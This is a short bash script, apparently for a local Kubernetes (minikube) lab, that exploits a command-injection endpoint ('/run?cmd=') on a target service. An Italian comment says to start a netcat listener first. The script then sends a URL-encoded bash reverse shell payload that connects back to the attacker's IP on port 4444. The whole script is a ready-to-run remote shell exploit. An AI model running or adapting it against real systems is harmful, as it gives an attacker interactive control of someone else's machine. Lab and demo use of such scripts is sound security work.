#!/bin/bash
TARGET=http://$(minikube ip):30080
LISTENER_PORT=4444
echo "[*] Avviare prima: nc -lvnp $LISTENER_PORT"
curl "$TARGET/run?cmd=bash+-i+>%26+/dev/tcp/$(hostname -I | awk '{print $1}')/$LISTENER_PORT+0>%261"
